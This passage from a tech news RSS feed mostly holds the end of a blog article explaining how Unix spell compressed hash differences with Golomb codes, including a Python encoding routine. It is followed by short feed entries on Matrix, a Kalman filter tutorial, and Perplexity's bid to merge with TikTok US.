href="https://en.wikipedia.org/wiki/Geometric_distribution" rel="">geometric distribution</a><span> is a discrete probability distribution which is used to model scenarios where we conduct an experiment until we get a success. For instance, rolling a six-faced die until we get a “1” forms a geometric distribution, with the probability of success being 1/6. A simpler example is tossing a coin until we get a head. </span></p><p><span>If the probability of failure is </span><code>p</code><span>, the probability of success is </span><code>q</code><span>, and if success occurs in the </span><code>kth</code><span> trial, then the </span><a href="https://en.wikipedia.org/wiki/Probability_mass_function" rel="">probability mass function</a><span> of the geometric distribution is given by the following formula:</span></p><div data-component-name="Latex"><p><span>\(\begin{align*}
&amp;P = p^kq
\end{align*}\)</span></p></div><p>Now, let's understand how the hash difference values map to this distribution.</p><p><span>As each hash code is </span><code>b</code><span> bits wide, we have a space of </span><code>2^b</code><span> points. And we have </span><code>v</code><span> hash codes spread out in this space. The probability of any point in this space containing a hash code is </span><code>q=v/2^b</code><span>, and the probability of a point being empty is </span><code>p=1-(v/2^b)</code><span>.</span></p><div data-component-name="Latex"><p><span>\(\begin{align*}
&amp;\text{P(a point containing a hash code)} = q = \frac{v}{2^b} \\
&amp;\text{P(an empty point)} = p = 1 - \left(\frac{v}{2^b}\right)
\end{align*}\)</span></p></div><p><span>But we are interested in modelling the distribution of hash difference values, rather than the hash codes themselves. A hash difference </span><code>k</code><span> occurs when two consecutive hash values in the sorted sequence are </span><code>k</code><span> positions apart. For instance, if we have two successive hash code values 20 and 25, then the hash difference is 5.</span></p><p><span>What's the probability of seeing a hash difference of </span><code>k</code><span>? Given any hash value </span><code>h</code><span> in our space:</span></p><ul><li><p><span>We need the next </span><code>k-1</code><span> positions after </span><code>h</code><span> to be empty</span></p></li><li><p><span>And then we need a hash value at position </span><code>h+k</code></p></li><li><p><span>The probability of </span><code>k-1</code><span> empty positions is </span><code>p^(k-1)</code></p></li><li><p><span>The probability of a hash value at position </span><code>h+k</code><span> is </span><code>q</code></p></li></ul><p><span>Therefore, the probability of a hash difference of </span><code>k</code><span> is:</span></p><div data-component-name="Latex"><p><span>\(\begin{align*}
&amp;\text{P(difference=k) =} p^\left(k-1\right)q
\end{align*}\)</span></p></div><p>This follows exactly the form of a geometric distribution!</p><blockquote><h5><em>If you read the spell paper, you will find that the author takes a different route to arrive at this conclusion. He models the generation of the hash codes as a Poisson process and proceeds from there.</em></h5></blockquote><p><span>But, what is the point of modelling this as a geometric distribution? It turns out, there is a very simple and efficient </span><a href="https://en.wikipedia.org/wiki/Run-length_encoding" rel="">run-length encoding</a><span> scheme for geometrically distributed integers given by Golomb in his 1965 </span><a href="https://web.stanford.edu/class/ee398a/handouts/papers/Golomb%20-%20Run-Length%20Codes%20-%20IT66.pdf" rel="">paper</a><span>. Let’s see how it works.</span></p><p>Golomb’s code is a simple run-length encoding scheme for geometrically distributed integers which was used by Douglas to compress the hash differences. It takes advantage of the fact that geometrically distributed values have an exponentially decaying probability of success, which can be leveraged for performing compression.</p><p><span>What do we mean by that? Recall that in the case of geometric distribution, the probability of success after </span><code>k</code><span> trials is given as:</span></p><p><span>Let’s say, we find an integer </span><code>m</code><span>, such that </span><code>p^m = 1/2</code><span>. Then, it means that the probability of success after </span><code>k + m</code><span> trials is:</span></p><div data-component-name="Latex"><p><span>\(\begin{align*}
&amp;\text{P(success after k + m trials)} = p^\left(k + m\right)q = \frac{1}{2}p^kq
\end{align*}\)</span></p></div><p><span>In other words, the probability of getting success in </span><code>k + m</code><span> trials is half of that of  the probability of getting a success in </span><code>m</code><span> trials. And this probability continues to half every </span><code>m</code><span> successive trials. This is an exponentially decaying distribution of probabilities.</span></p><p><span>Let's consider a fair coin toss example where we toss the coin until a head occurs. For a fair coin, </span><code>p = q = 1/2</code><span>.</span></p><p><span>Here, we have </span><code>m = 1</code><span>, because </span><code>p^1 = 1/2</code><span>. It means that the probabilities decay by half every trial:</span></p><div data-component-name="Latex"><p><span>\(\begin{align*}
&amp;P(k=1) = \frac{1}{2} \\
&amp;P(k=2) = \frac{1}{4} \\
&amp;P(k=3) = \frac{1}{8} \\
&amp;P(k=4) = \frac{1}{16}


\end{align*}\)</span></p></div><p><span>Let’s take another example of a biased coin, such that </span><code>p=1/sqrt(2) = 0.707</code><span>, and </span><code>q=0.293</code><span>.</span></p><p><span>Here, we have </span><code>m=2</code><span>, because </span><code>p^2 = 1/2</code><span>. In this case the probabilities decay after blocks of size 2.</span></p><div data-component-name="Latex"><p><span>\(\begin{align*}
&amp;P(k=1) = 0.293 \\
&amp;P(k=2) = 0.207 \\
&amp;P(k=3) = 0.116 \\
&amp;P(k=4) = 0.104 \\
&amp;P(k=5) = 0.073 \\
&amp;P(k=6) = 0.051


\end{align*}\)</span></p></div><p><span>You can see that the probabilities decay by half for every even value of </span><code>k</code><span>. For instance:</span></p><div data-component-name="Latex"><p><span>\(\frac{P(k=2)}{P(k=4)} = \frac{P(K=4)}{P(k=6)} \approx 0.5\)</span></p></div><p><span>This pattern of exponential decay allows us to group the hash difference values in blocks of size </span><code>m</code><span>. Each value within a block gets a code of size </span><code>k</code><span> bits, while the next block gets codes of size </span><code>k + 1</code><span> bits. The reasoning behind it is rooted in information theory.</span></p><p><span>The minimum number of bits required to encode the outcome of an event is given by its information content which is </span><code>-log₂(p)</code><span>, where </span><code>p</code><span> is the probability of that event. </span></p><p>It means that if an event has probability 1/2, it needs 1 bit code, an event with probability 1/4 needs 2 bits, an event with probability 1/8 needs 3 bit codes and so on.</p><p><span>We can leverage this for geometrically distributed values by arranging them in blocks of size </span><code>m</code><span>. The values within a given block can be assigned codes of equal length, and the values in the subsequent block gets codes one bit wider for its </span><code>m</code><span> values.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9ced331b-4cbe-4fb9-808b-43673c752884_680x165.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9ced331b-4cbe-4fb9-808b-43673c752884_680x165.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9ced331b-4cbe-4fb9-808b-43673c752884_680x165.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9ced331b-4cbe-4fb9-808b-43673c752884_680x165.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9ced331b-4cbe-4fb9-808b-43673c752884_680x165.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9ced331b-4cbe-4fb9-808b-43673c752884_680x165.png" width="680" height="165" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/9ced331b-4cbe-4fb9-808b-43673c752884_680x165.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:165,&quot;width&quot;:680,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:20471,&quot;alt&quot;:&quot;Arranging hash code differences in blocks of sizes m, where each block’s probability is half of that of its predecessor. If the predecessor block gets k bit wide codes, the next block gets k+1 bit wide codes.&quot;,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="Arranging hash code differences in blocks of sizes m, where each block’s probability is half of that of its predecessor. If the predecessor block gets k bit wide codes, the next block gets k+1 bit wide codes." title="Arranging hash code differences in blocks of sizes m, where each block’s probability is half of that of its predecessor. If the predecessor block gets k bit wide codes, the next block gets k+1 bit wide codes." srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9ced331b-4cbe-4fb9-808b-43673c752884_680x165.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9ced331b-4cbe-4fb9-808b-43673c752884_680x165.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9ced331b-4cbe-4fb9-808b-43673c752884_680x165.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9ced331b-4cbe-4fb9-808b-43673c752884_680x165.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>Arranging hash code differences in blocks of sizes m, where each block’s probability is half of that of its predecessor. If the predecessor block gets k bit wide codes, the next block gets k+1 bit wide codes.</figcaption></figure></div><p>It turns out, formation of blocks with increasingly larger codes also leads to a beautiful self-similar bit pattern with properties that make it very easy to generate such codes. Let’s see how this self-similar pattern forms.</p><p>Self-similar pattern essentially means that the codes at a specific index within a block repeats itself at the same index in the next block, with one padding bit added on its left.</p><p>For instance, if the code at the 2nd position in the first block is 0001, then the 2nd code in the 2nd block will be 10001. Similarly, the 2nd position code in the 3rd block will be 110001, and so on. </p><p>This self-similar pattern naturally emerges because of the enforcement of 1 bit longer codes in each successive block. Let us see a concrete example.</p><p><span>Let’s say, our block size is </span><code>m=5</code><span> and the codes in the first block are </span><code>k=4</code><span> bits wide. </span></p><p><span>If the first code in the first block is </span><code>0110</code><span>, then we can generate the codes for the rest of the block by adding 1 to the previous code value. The codes for the first block will look like this:</span></p><pre><code>block-1 codes: 0110 0111 1000 1001 1010</code></pre><p><span>As you can see, the first block ends at the code </span><code>1010</code><span>. The natural value for the next code should be </span><code>1011</code><span>, but because this code lies in the next block, its code has to be 1 bit larger. As a result we need to left shift it by one bit, which makes it </span><code>10110</code><span>. And if you notice the least 4 bits of this code are the same as the first code in the first block. The following diagram highlights this visually.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdb717247-7d87-4196-8c38-be44f82fe747_581x511.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdb717247-7d87-4196-8c38-be44f82fe747_581x511.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdb717247-7d87-4196-8c38-be44f82fe747_581x511.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdb717247-7d87-4196-8c38-be44f82fe747_581x511.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdb717247-7d87-4196-8c38-be44f82fe747_581x511.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdb717247-7d87-4196-8c38-be44f82fe747_581x511.png" width="581" height="511" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/db717247-7d87-4196-8c38-be44f82fe747_581x511.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:511,&quot;width&quot;:581,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:37780,&quot;alt&quot;:&quot;An example of self-similar codes. The first code in the first block are same as least 4 bits of the first code in the 2nd block&quot;,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="An example of self-similar codes. The first code in the first block are same as least 4 bits of the first code in the 2nd block" title="An example of self-similar codes. The first code in the first block are same as least 4 bits of the first code in the 2nd block" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdb717247-7d87-4196-8c38-be44f82fe747_581x511.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdb717247-7d87-4196-8c38-be44f82fe747_581x511.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdb717247-7d87-4196-8c38-be44f82fe747_581x511.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdb717247-7d87-4196-8c38-be44f82fe747_581x511.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>An example of self-similar codes. The first code in the first block are same as least 4 bits of the first code in the 2nd block</figcaption></figure></div><pre><code>Another thing worth Noticing here is that we are obtaining the first value of the 2nd block by left shifting it by 1 bit, which means its least significant bit (LSB) is always 0. 

For the self-similar patterns to form, the first code of the first block should also always have its LSB set to 0. This implies that this first code is always an even number of the form 2x. </code></pre><p><span>The self-similar code has a couple of additional properties which provide an intuitive way to figure out the minimum bit width </span><code>k</code><span> for the codes in the first block. Let’s see how.</span></p><p><span>To figure out the minimum number of bits needed to encode the first block, let’s assume the first encoded value in the first block is </span><code>2x</code><span>. </span></p><p><span>Then the first code of the 2nd block </span><em>should</em><span> be </span><code>2x + m</code><span>. However, because the codes in the next block need to be 1 bit wider, this value gets shifted to the left by 1 bit, which makes it </span><code>2(2x + m)</code><span>.</span></p><blockquote><h6><em>Left shifting a value by 1 bit doubles it.</em></h6></blockquote><p><span>The self-similarity pattern gives rise to another way to think about these codes. If the first code in the first block is </span><code>2x</code><span>, then in the next block:</span></p><ul><li><p><span>We want the same pattern (</span><code>2x</code><span>)</span></p></li><li><p>But with an extra bit on the left</p></li><li><p><span>Adding a bit on the left is equivalent to adding </span><code>2^k</code></p></li><li><p><span>So the code becomes </span><code>2^k + 2x</code></p></li></ul><p>Combining these two relations gives us the following equation</p><div data-component-name="Latex"><p><span>\(\begin{align*}
&amp;2^k + 2x = 2(2x + m) \\
&amp;\text{Or, } 2^k = 2m + 2x \\
&amp;\text{Here, x is a nonnegative integer, so we can simplify the above to:} \\
&amp;2^k \ge 2m
\end{align*}\)</span></p></div><p><span>By solving for the smallest integer value of </span><code>k</code><span> we can get the code width of the first block.</span></p><p><span>The same equation also gives us the value of </span><code>x</code><span>:</span></p><div data-component-name="Latex"><p><span>\(\begin{align*}
x = 2^\left(k-1\right) - m = 2^{\log_2(m)} - m
\end{align*}\)</span></p></div><p>Knowing the values of m, k, and x gives way for a simple encoding algorithm.</p><p>The paper by Golomb gave a different algorithm for encoding and decoding, but the Unix spell code used a slightly complicated but more efficient algorithm. I describe the algorithm as implemented in the Unix spell.</p><p>Let’s understand how to encode a value using Golomb’s code. Recall that we have:</p><ul><li><p><span>Initial bit width </span><code>k</code></p></li><li><p><span>Block size </span><code>m</code></p></li><li><p><span>First code in first block is </span><code>2x</code><span>, where </span><code>x = 2^(k-1) - m</code></p></li></ul><p>Here’s the encoding algorithm:</p><pre><code><code>def encode(value):
    # Case 1: Values less than x
    # These get shorter codes of length k-1
    # Because we have unused bit patterns available
    if value &lt; x:
        return value, k-1  # return (code, length)
    
    # Case 2: Values &gt;= x
    # Need to find which block they belong to
    value = value - x     # adjust relative to first code
    y = 1                 # tracks block number through bit shifts
    length = k           # start with k bits
    
    # Find block by repeatedly subtracting block size
    while value &gt;= m:    # m is block size
        value -= m       # move to next block
        y = y &lt;&lt; 1      # add padding bit for next block
        length += 1     # each block needs one more bit
    
    # Generate final code:
    # (y-1) &lt;&lt; k creates padding bits based on block number
    # x*2 adds offset for the first code
    # value adds position within current block
    code = ((y-1) &lt;&lt; k) + (x*2) + value
    return code, length
</code></code></pre><p>The following figure shows two examples to illustrate how it works in practice:</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6f59257e-3633-4a1a-baee-1bbf3ccde036_939x1121.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6f59257e-3633-4a1a-baee-1bbf3ccde036_939x1121.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6f59257e-3633-4a1a-baee-1bbf3ccde036_939x1121.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6f59257e-3633-4a1a-baee-1bbf3ccde036_939x1121.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6f59257e-3633-4a1a-baee-1bbf3ccde036_939x1121.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6f59257e-3633-4a1a-baee-1bbf3ccde036_939x1121.png" width="939" height="1121" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/6f59257e-3633-4a1a-baee-1bbf3ccde036_939x1121.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:1121,&quot;width&quot;:939,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:105065,&quot;alt&quot;:&quot;Examples of how the encoding algorithm works for values 2 and 8&quot;,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="Examples of how the encoding algorithm works for values 2 and 8" title="Examples of how the encoding algorithm works for values 2 and 8" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6f59257e-3633-4a1a-baee-1bbf3ccde036_939x1121.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6f59257e-3633-4a1a-baee-1bbf3ccde036_939x1121.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6f59257e-3633-4a1a-baee-1bbf3ccde036_939x1121.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6f59257e-3633-4a1a-baee-1bbf3ccde036_939x1121.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>Examples of how the encoding algorithm works for values 2 and 8</figcaption></figure></div><p><span>You can find the original Unix svr4 implementation of this algorithm </span><a href="https://github.com/calmsacibis995/svr4-src/blob/main/cmd/spell/huff.c#L105" rel="">here</a><span>.</span></p><p>The decoding process is also not that complicated. Given a code, we need to:</p><ol><li><p><span>First look at its top </span><code>k-1</code><span> bits (call this w):</span></p><ul><li><p><span>If </span><code>w</code><span> is less than </span><code>x</code><span>, then this is a shorter code</span></p></li><li><p><span>The decoded value is simply </span><code>w</code><span> itself</span></p></li></ul></li><li><p><span>If </span><code>w ≥ x</code><span>, then we need to </span></p><ul><li><p>Include one more bit into w</p></li><li><p><span>Look at the least significant </span><code>k</code><span> bits of </span><code>w</code><span>: call it </span><code>u</code></p></li><li><p><span>if </span><code>u &lt; 2x + m</code><span>:</span></p><ul><li><p><code>value = x + u + (s - 1)m</code></p></li><li><p><span>where </span><code>s</code><span> is the number of extra bits included into w</span></p></li></ul></li><li><p>else:</p><ul><li><p><span>keep including more bits into </span><code>w</code><span> until </span><code>u &lt; 2x + m</code></p></li></ul></li></ul></li></ol><p><span>You can find the original Unix svr4 implementation of the decode algorithm </span><a href="https://github.com/calmsacibis995/svr4-src/blob/main/cmd/spell/huff.c#L83" rel="">here</a><span>.</span></p><p>So how well this technique was able to compress the hash differences?</p><p>Recall that the theoretical limit of compression was 13.57 bits per word. Golomb codes managed to achieve an expected code length of 13.60, remarkably close to this theoretical minimum.</p><p>However, looking up a value in this compressed dictionary was quite slow. It required starting from the beginning, decoding and summing values until finding or exceeding the desired hash code.</p><p><span>To speed this up, the final Unix spell implementation partitioned the table of differences into </span><code>M</code><span> bins. This allowed them to first locate the correct bin, and then only scan within that bin, speeding up the search by a factor of </span><code>M</code><span>.</span></p><p><span>This partitioning scheme required storing additional pointers to the bins, adding </span><code>log₂M</code><span> bits per word to the storage requirement. The total storage increased to about 14 bits per word, but this was an acceptable trade-off: it was still within their memory budget while providing significantly faster lookups.</span></p><p data-attrs="{&quot;url&quot;:&quot;https://blog.codingconfessions.com/p/how-unix-spell-ran-in-64kb-ram?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share&quot;,&quot;text&quot;:&quot;Share&quot;,&quot;action&quot;:null,&quot;class&quot;:null}" data-component-name="ButtonCreateButton"><a href="https://blog.codingconfessions.com/p/how-unix-spell-ran-in-64kb-ram?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share" rel=""><span>Share</span></a></p><p>The Unix spell command is a fascinating piece of engineering history that emerged from the severe memory constraints of the PDP-11. What makes it particularly interesting is how it evolved from a simple disk-based dictionary lookup to an elegant solution combining multiple computer science concepts:</p><ul><li><p>Probabilistic data structures (Bloom filters)</p></li><li><p>Information theory (optimal bit width calculations)</p></li><li><p>Probability theory (geometric distribution)</p></li><li><p>Compression algorithms (Golomb coding)</p></li></ul><p>The engineering journey is particularly instructive:</p><ol><li><p>Started with Bloom filters achieving acceptable false positive rates</p></li><li><p>When dictionary size grew, switched to compressed hashing where:</p><ul><li><p>They computed theoretical minimum bits needed</p></li><li><p>Recognized patterns in hash differences</p></li><li><p>Used Golomb's code to achieve near-optimal compression</p></li><li><p>Added binning for faster lookups with minimal space overhead</p></li></ul></li></ol><p>Even though modern spell checkers use different techniques like edit distance and language models, the engineering insights from Unix spell remain valuable. It shows how deep understanding of theoretical concepts combined with practical constraints can lead to efficient and elegant solutions.</p><p>Most importantly, it demonstrates that some of the best innovations happen when we are resource constrained, forcing us to think deeper about our problems rather than throwing more hardware at them.</p><ul><li><p><a href="https://ia800601.us.archive.org/11/items/development-of-spelling-list/Image092317125441_text.pdf" rel="">Development of a Spelling List by Douglas McIlroy, 1982</a></p></li><li><p><a href="https://web.stanford.edu/class/ee398a/handouts/papers/Golomb%20-%20Run-Length%20Codes%20-%20IT66.pdf" rel="">Run-length Encodings by Golomb, 1965</a></p></li><li><p><a href="https://dl.acm.org/doi/pdf/10.1145/362686.362692" rel="">Space/Time Trade-offs in Hash Coding with Allowable Errors by Bloom, 1970</a></p></li><li><p><a href="https://dl.acm.org/doi/pdf/10.1145/3532.315102" rel="">A Spelling Checker by Jon Bentley, 1985</a></p></li><li><p><a href="https://en.wikipedia.org/wiki/History_of_Unix#1970s" rel="">History of Unix</a></p></li><li><p><a href="https://en.wikipedia.org/wiki/Geometric_distribution" rel="">Geometric Distribution</a></p></li><li><p><a href="https://blog.codingconfessions.com/p/bloom-filters-and-beyond" rel="">Bloom filter</a></p></li><li><p><a href="https://github.com/calmsacibis995/svr4-src/tree/main/cmd/spell" rel="">Unix Spell Source</a><span> </span></p></li></ul><p><em>If you find my work interesting and valuable, you can support me by opting for a paid subscription (it’s $6.40 monthly/$58 annual). As a bonus you get access to monthly live sessions, and all the past recordings.</em></p><p><strong>Subscribed</strong></p><p><em><span>Many people report failed payments, or don’t want a recurring subscription. For that I also have a </span><a href="https://buymeacoffee.com/codeconfessions" rel="">buymeacoffee page</a><span>. Where you can buy me a coffee or become a member. I will upgrade you to a paid subscription for the equivalent duration here.</span></em></p><p data-attrs="{&quot;url&quot;:&quot;https://buymeacoffee.com/codeconfessions&quot;,&quot;text&quot;:&quot;Buy me a coffee&quot;,&quot;action&quot;:null,&quot;class&quot;:&quot;button-wrapper&quot;}" data-component-name="ButtonCreateButton"><a href="https://buymeacoffee.com/codeconfessions" rel=""><span>Buy me a coffee</span></a></p><p><em>I also have a GitHub Sponsor page. You will get a sponsorship badge, and also a complementary paid subscription here.</em></p><p data-attrs="{&quot;url&quot;:&quot;https://github.com/sponsors/abhinav-upadhyay&quot;,&quot;text&quot;:&quot;Sponsor me on GitHub&quot;,&quot;action&quot;:null,&quot;class&quot;:&quot;button-wrapper&quot;}" data-component-name="ButtonCreateButton"><a href="https://github.com/sponsors/abhinav-upadhyay" rel=""><span>Sponsor me on GitHub</span></a></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Nation-scale Matrix deployments will fail using the community version of Synapse (115 pts)]]></title>
            <link>https://mastodon.matrix.org/@element/113842786942364269</link>
            <guid>42752402</guid>
            <pubDate>Sat, 18 Jan 2025 23:52:23 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://mastodon.matrix.org/@element/113842786942364269">https://mastodon.matrix.org/@element/113842786942364269</a>, See on <a href="https://news.ycombinator.com/item?id=42752402">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Kalman Filter Tutorial (300 pts)]]></title>
            <link>https://www.kalmanfilter.net/default.aspx</link>
            <guid>42751690</guid>
            <pubDate>Sat, 18 Jan 2025 21:50:15 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.kalmanfilter.net/default.aspx">https://www.kalmanfilter.net/default.aspx</a>, See on <a href="https://news.ycombinator.com/item?id=42751690">Hacker News</a></p>
Couldn't get https://www.kalmanfilter.net/default.aspx: Error: timeout of 10000ms exceeded]]></description>
        </item>
        <item>
            <title><![CDATA[Perplexity AI submits bid to merge with TikTok (108 pts)]]></title>
            <link>https://techcrunch.com/2025/01/18/perplexity-ai-submits-bid-to-merge-with-tiktok/</link>
            <guid>42751649</guid>
            <pubDate>Sat, 18 Jan 2025 21:42:31 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://techcrunch.com/2025/01/18/perplexity-ai-submits-bid-to-merge-with-tiktok/">https://techcrunch.com/2025/01/18/perplexity-ai-submits-bid-to-merge-with-tiktok/</a>, See on <a href="https://news.ycombinator.com/item?id=42751649">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
		
		<div>
			<div>
<p id="speakable-summary">With a TikTok ban looming in the United States, Perplexity AI is the latest bidder hoping to give the video app a new corporate home.</p>

<p>CNBC first <a rel="nofollow" href="https://www.cnbc.com/2025/01/18/perplexity-ai-makes-a-bid-to-merge-with-tiktok-us.html">reported on Perplexity’s interest</a>. A source with knowledge of the offer confirmed to TechCrunch that Perplexity (whose CEO Aravind Srinivas is pictured above) has submitted a bid to merge with TikTok US.</p>







<p>The source also confirmed other details about the bid — that it would create a new entity combining Perplexity, TikTok US, and new equity partners; that most investors in TikTok’s parent company ByteDance would be able to retain their equity; and that by merging, Perplexity hopes to bring more video to its AI search engine.</p>

<p>A law requiring ByteDance to either sell TikTok or see it banned in the US is set to take effect on Sunday, January 19. That will be President Joe Biden’s last day in office, and officials from his administration have said that <a href="https://techcrunch.com/2025/01/18/tiktok-says-it-will-go-dark-sunday-unless-biden-offers-definitive-statement/">it will leave the actual implementation of the ban</a> “to the next Administration.”</p>

